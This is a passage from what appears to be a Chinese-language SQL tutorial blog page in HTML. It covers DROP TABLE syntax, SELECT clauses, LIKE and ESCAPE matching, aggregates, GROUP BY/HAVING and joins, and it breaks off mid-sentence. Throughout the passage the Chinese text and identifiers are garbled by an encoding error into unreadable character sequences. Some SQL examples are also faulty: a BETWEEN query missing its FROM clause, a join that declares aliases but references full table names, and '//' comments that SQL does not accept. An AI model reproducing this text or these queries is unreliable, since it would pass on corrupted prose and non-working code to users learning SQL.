class="keyword">DROP</span> <span class="keyword">TABLE</span><span class="operator">&lt;</span>åŸºæœ¬è¡¨å<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ é™¤ä¸€ä¸ªè¡¨æ—¶,è¡¨çš„å®šä¹‰ã€è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®ä»¥åŠè¡¨çš„ç´¢å¼•ã€è§¦å‘å™¨ã€çº¦æŸç­‰å‡è¢«åˆ é™¤</p><p>ä¸èƒ½åˆ é™¤ç³»ç»Ÿè¡¨å’Œæœ‰å¤–ç çº¦æŸæ‰€å‚ç…§çš„è¡¨ï¼</p><h3 id="3-4æ•°æ®æŸ¥è¯¢"><a href="#3-4æ•°æ®æŸ¥è¯¢" class="headerlink" title="3.4æ•°æ®æŸ¥è¯¢"></a>3.4æ•°æ®æŸ¥è¯¢</h3><h4 id="3-4-1SELECT-è¯­å¥ç»“æ„"><a href="#3-4-1SELECT-è¯­å¥ç»“æ„" class="headerlink" title="3.4.1SELECT è¯­å¥ç»“æ„"></a>3.4.1SELECT è¯­å¥ç»“æ„</h4><p>1.SELECTè¯­å¥çš„åŸºæœ¬æ ¼å¼å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">ALL</span><span class="operator">|</span><span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span>ç›®æ ‡åˆ—è¡¨è¾¾å¼<span class="operator">&gt;</span> </span><br><span class="line">[, <span class="operator">&lt;</span>ç›®æ ‡åˆ—è¡¨è¾¾å¼<span class="operator">&gt;</span>]...</span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>è¡¨åæˆ–è§†å›¾å<span class="operator">&gt;</span>[, <span class="operator">&lt;</span>è¡¨åæˆ–è§†å›¾å<span class="operator">&gt;</span>]...</span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>æ¡ä»¶è¡¨è¾¾å¼<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>åˆ—å<span class="number">1</span><span class="operator">&gt;</span> [<span class="keyword">HAVING</span> <span class="operator">&lt;</span>æ¡ä»¶è¡¨è¾¾å¼<span class="operator">&gt;</span>]]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>åˆ—å<span class="number">2</span><span class="operator">&gt;</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>]]</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309012310536.png" style="zoom:50%;" /><p>ä¾‹:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å,è”ç³»ç”µè¯</span><br><span class="line"><span class="keyword">FROM</span> CustomerInfo</span><br><span class="line"><span class="keyword">WHERE</span> æ‰€åœ¨çœå¸‚<span class="operator">=</span><span class="string">&#x27;æ±Ÿè‹å—äº¬&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="3-4-2-å•è¡¨æŸ¥è¯¢"><a href="#3-4-2-å•è¡¨æŸ¥è¯¢" class="headerlink" title="3.4.2 å•è¡¨æŸ¥è¯¢"></a>3.4.2 å•è¡¨æŸ¥è¯¢</h4><p>æŸ¥è¯¢ä»…æ¶‰åŠä¸€ä¸ªè¡¨,æ˜¯ä¸€ç§æœ€ç®€å•çš„æŸ¥è¯¢æ“ä½œ</p><h5 id="1-é€‰æ‹©åˆ—"><a href="#1-é€‰æ‹©åˆ—" class="headerlink" title="1.é€‰æ‹©åˆ—"></a>1.é€‰æ‹©åˆ—</h5><p>(1)é€‰æ‹©æŒ‡å®šåˆ—</p><p>æŸ¥è¯¢å…¨ä½“å­¦ç”Ÿçš„å­¦å·ä¸å§“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno,Sname <span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><p>(2) é€‰æ‹©è¡¨ä¸­å…¨éƒ¨åˆ—</p><p>æŸ¥è¯¢å…¨ä½“å­¦ç”Ÿçš„è¯¦ç»†è®°å½•</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><p>(3)æŸ¥è¯¢ç»è¿‡è®¡ç®—çš„å€¼</p><p>æŸ¥è¯¢å…¨ä½“å­¦ç”Ÿçš„å§“ååŠå‡ºèº«å¹´ä»½, Sageä¸ºå¹´é¾„</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2022</span><span class="operator">-</span>Sage <span class="keyword">FROM</span> Student</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>ç¬¬<span class="number">2</span>åˆ—æ˜¯ä¸€ä¸ªç®—æœ¯è¡¨è¾¾å¼</span><br></pre></td></tr></table></figure><p>(4)æ›´æ”¹ç»“æœåˆ—æ ‡é¢˜</p><p>æŸ¥è¯¢å…¨ä½“å­¦ç”Ÿçš„å§“ååŠå‡ºç”Ÿå¹´ä»½,å‡ºç”Ÿå¹´ä»½æ ‡é¢˜ä¸ºSbirth</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,<span class="number">2022</span><span class="operator">-</span>Sage <span class="keyword">AS</span> Sbirth <span class="keyword">FROM</span> Student</span><br></pre></td></tr></table></figure><p>(5)æ›¿æ¢æŸ¥è¯¢ç»“æœä¸­çš„æ•°æ®</p><p>éœ€è¦ä½¿ç”¨æŸ¥è¯¢ä¸­çš„CASEè¡¨è¾¾å¼</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> </span><br><span class="line"><span class="keyword">WHEN</span> æ¡ä»¶<span class="number">1</span> <span class="keyword">THEN</span> è¡¨è¾¾å¼<span class="number">1</span></span><br><span class="line"><span class="keyword">WHEN</span> æ¡ä»¶<span class="number">2</span> <span class="keyword">THEN</span> è¡¨è¾¾å¼<span class="number">2</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">ELSE</span> è¡¨è¾¾å¼</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure><p>æ›¿æ¢æŸ¥è¯¢ç»“æœä¸­çš„æ•°æ®</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> å•†å“ç¼–å·,å•†å“åç§°,ä»·æ ¼ç­‰çº§<span class="operator">=</span></span><br><span class="line"><span class="keyword">CASE</span> </span><br><span class="line"><span class="keyword">WHEN</span> å•ä»· <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">THEN</span> <span class="string">&#x27;å°šæœªå®šä»·&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> å•ä»·<span class="operator">&lt;</span><span class="number">20</span> <span class="keyword">THEN</span> <span class="string">&#x27;ä½&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> å•ä»·<span class="operator">&gt;=</span><span class="number">20</span> <span class="keyword">AND</span> å•ä»·<span class="operator">&lt;=</span><span class="number">50</span> <span class="keyword">THEN</span> <span class="string">&#x27;ä¸­&#x27;</span></span><br><span class="line"><span class="keyword">WHEN</span> å•ä»·<span class="operator">&gt;</span><span class="number">50</span> <span class="keyword">AND</span> å•ä»·<span class="operator">&lt;=</span><span class="number">100</span> <span class="keyword">THEN</span> <span class="string">&#x27;è¾ƒé«˜&#x27;</span></span><br><span class="line"><span class="keyword">ELSE</span> <span class="string">&#x27;é«˜&#x27;</span></span><br><span class="line"><span class="keyword">END</span></span><br><span class="line"><span class="keyword">FROM</span> GoodsInfo</span><br></pre></td></tr></table></figure><p>(6) å»é™¤é‡å¤è¡Œ</p><p>åœ¨OrderListè¡¨ä¸­æŸ¥è¯¢è®¢è´­äº†å•†å“çš„å®¢æˆ·ç¼–å·</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> å®¢æˆ·ç¼–å· <span class="keyword">FROM</span> OrderList</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢é€‰ä¿®è¯¾ç¨‹çš„å„ç§æˆç»©</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> Cno,Grade <span class="keyword">FROM</span> SC</span><br></pre></td></tr></table></figure><h5 id="2-é€‰æ‹©è¡¨ä¸­çš„è‹¥å¹²å…ƒç¥–"><a href="#2-é€‰æ‹©è¡¨ä¸­çš„è‹¥å¹²å…ƒç¥–" class="headerlink" title="2.é€‰æ‹©è¡¨ä¸­çš„è‹¥å¹²å…ƒç¥–"></a>2.é€‰æ‹©è¡¨ä¸­çš„è‹¥å¹²å…ƒç¥–</h5><p>(1)æ¯”è¾ƒå¤§å°</p><p>å¸¸ç”¨æ¯”è¾ƒè¿ç®—ç¬¦: &#x3D;,&lt;,&gt;,&gt;&#x3D;,&lt;&#x3D;,!&#x3D; æˆ– &lt;&gt; , !&gt;, !&lt;,    é€»è¾‘è¿ç®—ç¬¦ NOT + æ¯”è¾ƒè¿ç®—ç¬¦</p><p>æŸ¥è¯¢æ‰€æœ‰å¹´é¾„åœ¨20å²ä»¥ä¸‹çš„å­¦ç”Ÿå§“ååŠå…¶å¹´é¾„</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sage <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">20</span></span><br><span class="line"><span class="keyword">SELECT</span> Sname,Sage <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> <span class="keyword">NOT</span> Sage<span class="operator">&gt;=</span><span class="number">20</span></span><br></pre></td></tr></table></figure><p>(2) æŒ‡å®šèŒƒå›´</p><p>ä½¿ç”¨è°“è¯ BETWEEN â€¦ AND â€¦ , NOT BETWEEN â€¦ AND â€¦</p><p>æŸ¥è¯¢å¹´é¾„åœ¨20~23å²ä¹‹é—´(åŒ…æ‹¬20å²å’Œ23å²)çš„å­¦ç”Ÿå§“åã€ç³»åˆ«å’Œå¹´é¾„ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sdept,Sage <span class="keyword">WHERE</span> Sage <span class="keyword">BETWEEN</span> <span class="number">20</span> <span class="keyword">AND</span> <span class="number">23</span></span><br></pre></td></tr></table></figure><p>(3)ç¡®å®šé›†åˆ</p><p>ä½¿ç”¨è°“è¯ IN&lt;å€¼è¡¨&gt; æˆ– NOT IN &lt;å€¼è¡¨&gt;</p><p>&lt;å€¼è¡¨&gt; : ç”¨, åˆ†éš”çš„ä¸€ç»„å–å€¼</p><p>æŸ¥è¯¢ä¿¡æ¯ç³»,æ•°å­¦ç³»å’Œè®¡ç®—æœºå­¦ç”Ÿçš„å§“åå’Œæ€§åˆ«</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept <span class="keyword">IN</span> (<span class="string">&#x27;IS&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;CS&#x27;</span>)</span><br></pre></td></tr></table></figure><p>(4)å­—ç¬¦ä¸²åŒ¹é…</p><p>a.[NOT] LIKE â€˜&lt;åŒ¹é…ä¸²&gt;â€™ [ESCAPE â€˜&lt;æ¢ç å­—ç¬¦&gt;â€™]</p><p>&#x3D; å¯ä»¥ç”¨æ¥å–ä»£LIKEã€‚!&#x3D;æˆ–&lt;&gt;è¿ç®—ç¬¦å–ä»£NOT LIKE è°“è¯</p><p>b.é€šé…ç¬¦</p><p>%ä»£è¡¨ä»»æ„é•¿åº¦(é•¿åº¦å¯ä»¥ä¸º0)å­—ç¬¦ä¸²</p><p>ä¾‹: a%b, å¦‚ab,asjdlab,acb éƒ½æ»¡è¶³è¯¥åŒ¹é…ä¸²</p><p>_(ä¸‹åˆ’çº¿)ä»£è¡¨ä»»æ„å•ä¸ªå­—ç¬¦</p><p>ä¾‹: a_b,å¦‚acb,afbéƒ½æ»¡è¶³è¯¥åŒ¹é…ä¸²</p><p>1)ç²¾ç¡®åŒ¹é…</p><p>åŒ¹é…å­¦å·ä¸º95001çš„å­¦ç”Ÿçš„è¯¦ç»†æƒ…å†µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sno <span class="keyword">LIKE</span> <span class="string">&#x27;95001&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;95001&#x27;</span></span><br></pre></td></tr></table></figure><p>2)æ¨¡ç³ŠåŒ¹é…</p><p>æŸ¥è¯¢æ‰€æœ‰å§“åˆ˜å­¦ç”Ÿçš„å§“åã€å­¦å·å’Œæ€§åˆ«</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;åˆ˜%&#x27;</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å§“â€™æ¬§é˜³â€™ä¸”å…¨åä¸ºä¸‰ä¸ªæ±‰å­—çš„å­¦ç”Ÿå§“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Sno,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sname <span class="keyword">LIKE</span> <span class="string">&#x27;æ¬§é˜³_&#x27;</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ‰€æœ‰ä¸å§“åˆ˜çš„å­¦ç”Ÿå§“å</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sname <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">&#x27;åˆ˜%&#x27;</span></span><br></pre></td></tr></table></figure><p>3)ESCAPE çŸ­è¯­:</p><p>å½“ç”¨æˆ·è¦æŸ¥è¯¢çš„å­—ç¬¦ä¸²æœ¬èº«å°±å«æœ‰%æˆ–_æ—¶,è¦ä½¿ç”¨ESCAPE â€˜&lt;æ¢ç å­—ç¬¦&gt;â€™ çŸ­è¯­å¯¹é€šé…ç¬¦è¿›è¡Œè½¬ä¹‰</p><p>æŸ¥è¯¢DB_Designè¯¾ç¨‹çš„è¯¾ç¨‹å·å’Œå­¦åˆ†</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,Ccredit <span class="keyword">FROM</span> Course <span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_Design&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ä»¥â€DB_â€å¼€å¤´,ä¸”å€’æ•°ç¬¬ä¸‰ä¸ªå­—ç¬¦ä¸ºiçš„è¯¾ç¨‹çš„è¯¦ç»†æƒ…å†µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Course <span class="keyword">WHERE</span> Cname <span class="keyword">LIKE</span> <span class="string">&#x27;DB\_%i__&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;\&#x27;</span></span><br></pre></td></tr></table></figure><p>(5) æ¶‰åŠç©ºå€¼çš„æŸ¥è¯¢</p><p>ä½¿ç”¨IS NULL æˆ–IS NOT NULL</p><p>æŸäº›å­¦ç”Ÿé€‰ä¿®è¯¾ç¨‹åæ²¡æœ‰å‚åŠ ,æ‰€ä»¥æœ‰é€‰è¯¾è®°å½•,å•æ²¡æœ‰è€ƒè¯•æˆç»©ã€‚æŸ¥è¯¢ç¼ºå°‘æˆç»©çš„å­¦ç”Ÿçš„å­¦å·å’Œç›¸åº”çš„è¯¾ç¨‹å·ã€‚</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sno, Cno <span class="keyword">FROM</span> SC <span class="keyword">WHERE</span> Grade <span class="keyword">IS</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure><p>(6)å¤šé‡æ¡ä»¶æŸ¥è¯¢</p><p>ç”¨é€»è¾‘è¿ç®—ç¬¦ANDå’ŒORæ¥è”ç»“å¤šä¸ªæŸ¥è¯¢æ¡ä»¶</p><p>ANDçš„ä¼˜å…ˆçº§é«˜äºOR,å¯ä»¥ç”¨æ‹¬å·æ”¹å˜ä¼˜å…ˆçº§</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span> <span class="keyword">AND</span> Sage<span class="operator">&lt;</span><span class="number">20</span></span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢ä¿¡æ¯ç³»ã€æ•°å­¦ç³»å’Œè®¡ç®—æœºç³»å­¦ç”Ÿçš„å§“åå’Œæ€§åˆ«</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sname,Ssex <span class="keyword">FROM</span> Student <span class="keyword">WHERE</span> Sdept<span class="operator">=</span><span class="string">&#x27;IS&#x27;</span> <span class="keyword">OR</span> Sdept<span class="operator">=</span><span class="string">&#x27;MA&#x27;</span> <span class="keyword">OR</span> Sdept<span class="operator">=</span><span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure><p>(7)å¯¹æŸ¥è¯¢ç»“æœæ’åº</p><p>å‡åº:ASC é™åº:DESC é»˜è®¤å€¼ä¸ºå‡åº(ASC)</p><p>ORDER BY &lt;åˆ—å1&gt;[ASC|DESC]</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> SC <span class="keyword">order</span> <span class="keyword">by</span> Sno <span class="keyword">desc</span>, Cno<span class="operator">/</span><span class="operator">/</span>Cnoä¸ºå‡åº<span class="keyword">asc</span></span><br></pre></td></tr></table></figure><p>(8)èšåˆå‡½æ•°</p><p>èšåˆå‡½æ•°æ˜¯æŒ‡å¯¹é›†åˆæ“ä½œä½†åªè¿”å›å•ä¸ªå€¼çš„å‡½æ•°</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020011168.png" style="zoom:50%;" /><p>æŸ¥è¯¢GoddsInfoè¡¨ä¸­æ‰€æœ‰å•†å“çš„å¹³å‡å•ä»·</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(å•ä»·) <span class="keyword">AS</span> <span class="string">&#x27;å¹³å‡å•ä»·&#x27;</span> <span class="keyword">FROM</span> GoodsInfo</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢GoodsInfoè¡¨ä¸­æœ€é«˜å’Œæœ€ä½å•ä»·</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MAX</span>(å•ä»·) <span class="keyword">AS</span> <span class="string">&#x27;æœ€é«˜å•ä»·&#x27;</span>, <span class="built_in">MIN</span>(å•ä»·) <span class="keyword">AS</span> <span class="string">&#x27;æœ€ä½å•ä»·&#x27;</span> <span class="keyword">FROM</span> GoodsInfo</span><br></pre></td></tr></table></figure><p>COUNTç”¨äºç»Ÿè®¡ç»„ä¸­æ»¡è¶³æ¡ä»¶çš„è¡Œæ•°æˆ–æ€»è¡Œæ•°</p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309020014187.png" style="zoom:50%;" /><p>æŸ¥è¯¢å®¢æˆ·æ€»æ•°</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="string">&#x27;å®¢æˆ·æ€»æ•°&#x27;</span> <span class="keyword">FROM</span> CustomerInfo</span><br></pre></td></tr></table></figure><p>(9)å¯¹æŸ¥è¯¢ç»“æœåˆ†ç»„</p><p>SELECTè¯­å¥çš„GROUP BYå­å¥ä½œç”¨äºæŸ¥è¯¢çš„ä¸­é—´ç»“æœè¡¨,æŒ‰æŸä¸€åˆ—æˆ–å¤šåˆ—å€¼è¿›è¡Œåˆ†ç»„,å€¼ç›¸ç­‰çš„ä¸ºä¸€ç»„</p><p>åˆ†ç»„,èšé›†å‡½æ•°ä½œç”¨äºæ¯ä¸ªåˆ†ç»„</p><p>ä¸åˆ†ç»„,èšé›†å‡½æ•°ä½œç”¨äºæ•´ä¸ªæŸ¥è¯¢ç»“æœ</p><p>æŸ¥è¯¢å„è¯¾ç¨‹çš„è¯¾ç¨‹çš„è¯¾ç¨‹å·ä¸ç›¸åº”çš„é€‰ä¿®äººæ•°</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">count</span>(Sno) <span class="keyword">from</span> SC <span class="keyword">group</span> <span class="keyword">by</span> Cno</span><br></pre></td></tr></table></figure><p>(10)ä½¿ç”¨HAVINGå­å¥è¿›è¡Œç­›é€‰</p><p>HAVINGå­å¥å¿…é¡»ä¸GROUP BY å­å¥ç»“åˆä½¿ç”¨</p><p>æŸ¥è¯¢å¹³å‡æˆç»©ä¸º90åˆ†åŠä»¥ä¸Šçš„å„è¯¾ç¨‹çš„è¯¾ç¨‹å·ä¸ç›¸åº”çš„å¹³å‡æˆç»©</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Cno,<span class="built_in">AVG</span>(Grade) <span class="keyword">FROM</span> SC <span class="keyword">GROUP</span> <span class="keyword">BY</span> Cno <span class="keyword">HAVING</span> <span class="built_in">AVG</span>(Grade) <span class="operator">&gt;=</span> <span class="number">90</span></span><br></pre></td></tr></table></figure><p>æ³¨!</p><p>Whereå­å¥ä¸­ä¸èƒ½ç”¨èšåˆå‡½æ•°ä½œä¸ºæ¡ä»¶è¡¨è¾¾å¼, WHERE AVG(Grade) &gt;&#x3D;90çš„å†™æ³•æ˜¯é”™è¯¯çš„!</p><p>WHEREå­å¥ä½œç”¨äºåŸºæœ¬è¡¨æˆ–è§†å›¾,HAVINGçŸ­è¯­ä½œç”¨äºç»„</p><h4 id="3-4-3-è¿æ¥æŸ¥è¯¢"><a href="#3-4-3-è¿æ¥æŸ¥è¯¢" class="headerlink" title="3.4.3 è¿æ¥æŸ¥è¯¢"></a>3.4.3 è¿æ¥æŸ¥è¯¢</h4><p>åŒæ—¶æ¶‰åŠå¤šä¸ªè¡¨çš„æŸ¥è¯¢ç§°ä¸ºè¿æ¥æŸ¥è¯¢</p><p>è¿æ¥æŸ¥è¯¢æœ‰ä¸¤ç§å½¢å¼: 1. è¿æ¥è°“è¯ã€‚2.ä»¥JOINå…³é”®å­—æŒ‡å®šçš„è¿æ¥ã€‚</p><h5 id="1-è¿æ¥è°“è¯"><a href="#1-è¿æ¥è°“è¯" class="headerlink" title="1.è¿æ¥è°“è¯"></a>1.è¿æ¥è°“è¯</h5><p>ç”¨æ¥è¿æ¥ä¸¤ä¸ªè¡¨çš„æ¡ä»¶ç§°ä¸ºè¿æ¥æ¡ä»¶æˆ–è¿æ¥è°“è¯ï¼Œå¯ç”¨é€»è¾‘è¿ç®—ç¬¦ANDå’ŒOR æ¥è¿æ¥å¤šä¸ªè¿æ¥è°“è¯</p><p>è¿æ¥å­—æ®µ:è¿æ¥è°“è¯ä¸­çš„åˆ—åç§°ä¸ºè”ç»“å­—æ®µ</p><p>ä¸€èˆ¬æ ¼å¼: &lt;è¡¨å1&gt;.åˆ—å &lt;æ¯”è¾ƒè¿ç®—ç¬¦&gt; &lt;è¡¨å2&gt;.&lt;åˆ—å2&gt;</p><p>ç­‰å€¼è¿æ¥å®ä¾‹:</p><p>æŸ¥è¯¢æ¯ä¸ªå­¦ç”ŸåŠå…¶é€‰è¯¾æƒ…å†µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.<span class="operator">*</span>,SC.<span class="operator">*</span> <span class="keyword">FROM</span> Student,SC <span class="keyword">WHERE</span> Student.Sno<span class="operator">=</span>Sc.Sno</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢é€‰ä¿®äº†ä¸‰å·è¯¾ç¨‹ä¸”æˆç»©åœ¨90åˆ†ä»¥ä¸Šæ‰€æœ‰å­¦ç”Ÿçš„å­¦å·ã€å§“å-å¤åˆæ¡ä»¶è¿æ¥</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Student.Sno,Sname <span class="keyword">from</span> Student,SC <span class="keyword">where</span> Student.Sno<span class="operator">=</span>Sc.Sno <span class="keyword">and</span> Sc.Cno<span class="operator">=</span><span class="number">3</span> <span class="keyword">and</span> SC.Grade<span class="operator">&gt;</span><span class="number">90</span></span><br></pre></td></tr></table></figure><p>åœ¨Customerè¡¨ä¸­æŸ¥è¯¢å…·æœ‰ç›¸åŒå§“åçš„å®¢æˆ·ä¿¡æ¯</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> KH1.<span class="operator">*</span> <span class="keyword">FROM</span> CustomerInfo KH1, CustomerInfo KH2 <span class="keyword">WHERE</span> KH1.å®¢æˆ·å§“å<span class="operator">=</span>KH2.å®¢æˆ·å§“å <span class="keyword">AND</span> KH1.å®¢æˆ·ç¼–å·<span class="operator">&lt;&gt;</span>KH2.å®¢æˆ·ç¼–å·</span><br></pre></td></tr></table></figure><h5 id="2-ä»¥JOINå…³é”®å­—æŒ‡å®šçš„è¿æ¥"><a href="#2-ä»¥JOINå…³é”®å­—æŒ‡å®šçš„è¿æ¥" class="headerlink" title="2.ä»¥JOINå…³é”®å­—æŒ‡å®šçš„è¿æ¥"></a>2.ä»¥JOINå…³é”®å­—æŒ‡å®šçš„è¿æ¥</h5><p>INNER JOIN-å†…è¿æ¥, OUTER JOIN-å¤–è¿æ¥</p><p>a.å†…è¿æ¥</p><p>å†…è¿æ¥æŒ‰ç…§ONæ‰€æŒ‡å®šçš„è¿æ¥æ¡ä»¶åˆå¹¶ä¸¤ä¸ªè¡¨,è¿”å›æ»¡è¶³æ¡ä»¶çš„è¡Œ,ä¸€èˆ¬æ ¼å¼</p><p>FROM &lt;è¡¨å1&gt; JOIN &lt;è¡¨å2&gt; ON &lt;è¡¨å1.åˆ—å&gt;&#x3D;&lt;è¡¨å2.åˆ—å&gt;</p><p>ä¾‹: æŸ¥æ‰¾å•†å“è®¢è´­æ•°æ®åº“æ¯ä¸ªè®¢è´­äº†å•†å“çš„å®¢æˆ·åŠè®¢å•æƒ…å†µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.<span class="operator">*</span>,b.å•†å“ç¼–å·,b.è®¢è´­æ—¶é—´,b.æ•°é‡,b.éœ€è¦æ—¥æœŸ,b.ä»˜æ¬¾æ–¹å¼,b.é€è´§æ–¹å¼ <span class="keyword">FROM</span> CustomerInfo a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> OrderList b <span class="keyword">ON</span> CustomerInfo.å®¢æˆ·ç¼–å·<span class="operator">=</span>OrderList.å®¢æˆ·ç¼–å·</span><br></pre></td></tr></table></figure><p>ç”¨FROMçš„JOINå…³é”®å­—è¡¨è¾¾ä¸‹åˆ—æŸ¥è¯¢:åœ¨å•†å“æ•°æ®åº“ä¸­æŸ¥è¯¢è®¢è´­äº†ç±»åˆ«ä¸ºâ€ä½“è‚²ç”¨å“â€çš„å®¢æˆ·çš„å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å,è”ç³»æ–¹å¼ä»¥åŠå•†å“çš„éœ€è¦æ—¥æœŸ</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> CustomerInfo.å®¢æˆ·ç¼–å·,å®¢æˆ·å§“å,è”ç³»ç”µè¯,éœ€è¦æ—¥æœŸ <span class="keyword">FROM</span> CustomerInfo <span class="keyword">JOIN</span> GoodsInfo <span class="keyword">JOIN</span> OrderList <span class="keyword">ON</span> GoodsInfo.å•†å“ç¼–å·<span class="operator">=</span>OrderList.å•†å“ç¼–å· <span class="keyword">ON</span> CustomerInfo.å®¢æˆ·ç¼–å· <span class="operator">=</span> OrderList.å®¢æˆ·ç¼–å· <span class="keyword">WHERE</span> å•†å“ç±»åˆ« <span class="operator">=</span> <span class="string">&#x27;ä½“è‚²ç”¨å“&#x27;</span></span><br></pre></td></tr></table></figure><p>b.å¤–è¿æ¥</p><p>å¤–è¿æ¥çš„ç»“æœè¡¨ä¸ä½†åŒ…å«æ»¡è¶³è¿æ¥æ¡ä»¶çš„è¡Œ,è¿˜åŒ…æ‹¬ç›¸åº”è¡¨ä¸­çš„æ‰€æœ‰è¡Œ.</p><p>å¤–è¿æ¥åŒ…æ‹¬ä¸‰ç§: 